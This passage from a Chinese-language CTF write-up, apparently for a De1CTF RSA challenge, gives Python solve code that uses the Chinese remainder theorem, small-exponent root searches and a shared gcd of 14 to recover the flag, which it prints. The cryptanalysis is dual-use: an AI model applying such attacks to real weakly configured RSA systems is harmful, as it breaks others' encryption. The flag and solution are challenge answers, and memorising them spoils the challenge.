    <span class="token number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031</span><span class="token punctuation">,</span>
    <span class="token number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446</span><span class="token punctuation">,</span>
    <span class="token number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797</span><span class="token punctuation">]</span>
f <span class="token operator">=</span> <span class="token keyword">lambda</span> m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">,</span> c<span class="token punctuation">:</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">==</span> c
<span class="token keyword">assert</span> <span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span>

ee1 <span class="token operator">=</span> <span class="token number">42</span>
ee2 <span class="token operator">=</span> <span class="token number">3</span>
ce1 <span class="token operator">=</span> <span class="token number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span>
ce2 <span class="token operator">=</span> <span class="token number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span>
tmp <span class="token operator">=</span> <span class="token number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span>
n <span class="token operator">=</span> <span class="token number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span>
<span class="token keyword">assert</span> <span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>e1<span class="token punctuation">,</span> ee1<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">==</span> ce1<span class="token punctuation">)</span>
<span class="token keyword">assert</span> <span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>e2 <span class="token operator">+</span> tmp<span class="token punctuation">,</span> ee2<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">==</span> ce2<span class="token punctuation">)</span>

e <span class="token operator">=</span> <span class="token number">46531</span>
n <span class="token operator">=</span> <span class="token number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span>
c <span class="token operator">=</span> <span class="token number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span>
hint <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>hint<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
<span class="token keyword">assert</span> <span class="token punctuation">(</span>q1p <span class="token operator">*</span> q1q <span class="token operator">==</span> n<span class="token punctuation">)</span>
<span class="token keyword">assert</span> <span class="token punctuation">(</span>q1p <span class="token operator">&lt;</span> q1q<span class="token punctuation">)</span>
<span class="token keyword">assert</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>hint<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span>

flag <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
q1 <span class="token operator">=</span> q1p
q2 <span class="token operator">=</span> <span class="token number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span>
c1 <span class="token operator">=</span> <span class="token number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span>
c2 <span class="token operator">=</span> <span class="token number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span>
<span class="token keyword">assert</span> <span class="token punctuation">(</span>c1 <span class="token operator">==</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> p <span class="token operator">*</span> q1<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">assert</span> <span class="token punctuation">(</span>c2 <span class="token operator">==</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> p <span class="token operator">*</span> q2<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最后求flag的这一步有些复杂。首先是看题目给出的两个式子就知道不是可以直接求得flag的，事实也正是如此。因为这里求得的<code>e1和phi1</code>、<code>e1和phi2</code>是有相同的最大公约数<strong>14</strong>的。可以先求出<code>m^14</code>这个值，然后再根据<code>q1、q2</code>跟<code>m^14</code>这个值的关系利用中国剩余定理求得关于<code>m^2</code>的另一个rsa的算式，可以直接求出m也就是flag。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii
<span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

n <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423</span><span class="token punctuation">,</span>
    <span class="token number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421</span><span class="token punctuation">,</span>
    <span class="token number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303</span><span class="token punctuation">,</span>
    <span class="token number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791</span><span class="token punctuation">]</span>
c <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569</span><span class="token punctuation">,</span>
    <span class="token number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031</span><span class="token punctuation">,</span>
    <span class="token number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446</span><span class="token punctuation">,</span>
    <span class="token number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> n1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>
    c <span class="token operator">=</span> a2 <span class="token operator">-</span> a1
    <span class="token keyword">if</span> c <span class="token operator">%</span> d <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span>
    c <span class="token operator">=</span> <span class="token punctuation">(</span>c <span class="token operator">%</span> n2 <span class="token operator">+</span> n2<span class="token punctuation">)</span> <span class="token operator">%</span> n2
    c <span class="token operator">=</span> c <span class="token operator">//</span> d
    n1 <span class="token operator">=</span> n1 <span class="token operator">//</span> d
    n2 <span class="token operator">=</span> n2 <span class="token operator">//</span> d
    c <span class="token operator">*=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>
    c <span class="token operator">%=</span> n2
    c <span class="token operator">*=</span> n1 <span class="token operator">*</span> d
    c <span class="token operator">+=</span> a1
    <span class="token keyword">global</span> n3
    <span class="token keyword">global</span> a3
    n3 <span class="token operator">=</span> n1 <span class="token operator">*</span> n2 <span class="token operator">*</span> d
    a3 <span class="token operator">=</span> <span class="token punctuation">(</span>c <span class="token operator">%</span> n3 <span class="token operator">+</span> n3<span class="token punctuation">)</span> <span class="token operator">%</span> n3
    <span class="token keyword">return</span> <span class="token number">1</span>


<span class="token keyword">def</span> <span class="token function">exCRT</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    a1 <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    n1 <span class="token operator">=</span> n<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    le <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> le<span class="token punctuation">)</span><span class="token punctuation">:</span>
        a2 <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        n2 <span class="token operator">=</span> n<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> merge<span class="token punctuation">(</span>a1<span class="token punctuation">,</span> n1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>
        a1 <span class="token operator">=</span> a3
        n1 <span class="token operator">=</span> n3
    <span class="token keyword">global</span> mod
    mod <span class="token operator">=</span> n1
    <span class="token keyword">return</span> <span class="token punctuation">(</span>a1 <span class="token operator">%</span> n1 <span class="token operator">+</span> n1<span class="token punctuation">)</span> <span class="token operator">%</span> n1


p <span class="token operator">=</span> exCRT<span class="token punctuation">(</span>c<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>

ee1 <span class="token operator">=</span> <span class="token number">42</span>
ee2 <span class="token operator">=</span> <span class="token number">3</span>
ce1 <span class="token operator">=</span> <span class="token number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span>
ce2 <span class="token operator">=</span> <span class="token number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span>
tmp <span class="token operator">=</span> <span class="token number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span>
n <span class="token operator">=</span> <span class="token number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span>


<span class="token keyword">def</span> <span class="token function">rune</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>
    k <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        x <span class="token operator">=</span> c <span class="token operator">+</span> k <span class="token operator">*</span> n
        <span class="token keyword">if</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        k <span class="token operator">=</span> k <span class="token operator">+</span> <span class="token number">1</span>


e1 <span class="token operator">=</span> rune<span class="token punctuation">(</span>ee1<span class="token punctuation">,</span> n<span class="token punctuation">,</span> ce1<span class="token punctuation">)</span>
e2 <span class="token operator">=</span> rune<span class="token punctuation">(</span>ee2<span class="token punctuation">,</span> n<span class="token punctuation">,</span> ce2<span class="token punctuation">)</span> <span class="token operator">-</span> tmp
<span class="token keyword">print</span><span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>

e <span class="token operator">=</span> <span class="token number">46531</span>
n <span class="token operator">=</span> <span class="token number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span>
c <span class="token operator">=</span> <span class="token number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span>
<span class="token comment"># 上面的这个n是可以在线分解的，但是线下的时候不能用在线的环境哎</span>
q1q <span class="token operator">=</span> <span class="token number">127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088834871</span>
q1p <span class="token operator">=</span> n <span class="token operator">//</span> q1q
<span class="token keyword">if</span> q1p <span class="token operator">></span> q1q<span class="token punctuation">:</span>
    q1p<span class="token punctuation">,</span> q1q <span class="token operator">=</span> q1q<span class="token punctuation">,</span> q1p
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>q1p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q1q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
hint <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>hint<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># b'orz...you.found.me.but.sorry.no.hint...keep.on.and.enjoy.it!'</span>

q1 <span class="token operator">=</span> q1p
q2 <span class="token operator">=</span> <span class="token number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span>
c1 <span class="token operator">=</span> <span class="token number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span>
c2 <span class="token operator">=</span> <span class="token number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>e2<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

e1 <span class="token operator">=</span> e1 <span class="token operator">//</span> <span class="token number">14</span>
e2 <span class="token operator">=</span> e2 <span class="token operator">//</span> <span class="token number">14</span>

d1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
d2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e2<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

nn <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
aa <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
nn<span class="token punctuation">.</span>append<span class="token punctuation">(</span>q1<span class="token punctuation">)</span>
nn<span class="token punctuation">.</span>append<span class="token punctuation">(</span>q2<span class="token punctuation">)</span>
a1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> d1<span class="token punctuation">,</span> p <span class="token operator">*</span> q1<span class="token punctuation">)</span> <span class="token operator">%</span> q1
a2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> d2<span class="token punctuation">,</span> p <span class="token operator">*</span> q2<span class="token punctuation">)</span> <span class="token operator">%</span> q2
aa<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a1<span class="token punctuation">)</span>
aa<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a2<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">exCRT_getequation</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    a1 <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    n1 <span class="token operator">=</span> n<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    le <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> le<span class="token punctuation">)</span><span class="token punctuation">:</span>
        a2 <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        n2 <span class="token operator">=</span> n<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> merge<span class="token punctuation">(</span>a1<span class="token punctuation">,</span> n1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>
        a1 <span class="token operator">=</span> a3
        n1 <span class="token operator">=</span> n3
    <span class="token keyword">return</span> <span class="token punctuation">(</span>a1<span class="token punctuation">,</span> n1<span class="token punctuation">)</span>


m14<span class="token punctuation">,</span> n <span class="token operator">=</span> exCRT_getequation<span class="token punctuation">(</span>aa<span class="token punctuation">,</span> nn<span class="token punctuation">)</span>  <span class="token comment"># 最终方程组 aa=n^14%q1*q2</span>

m2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m14<span class="token punctuation">,</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>q1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># de1ctf&#123;9b10a98b-71bb-4bdf-a6ff-f319943de21f&#125;</span><span aria-hidden="true" 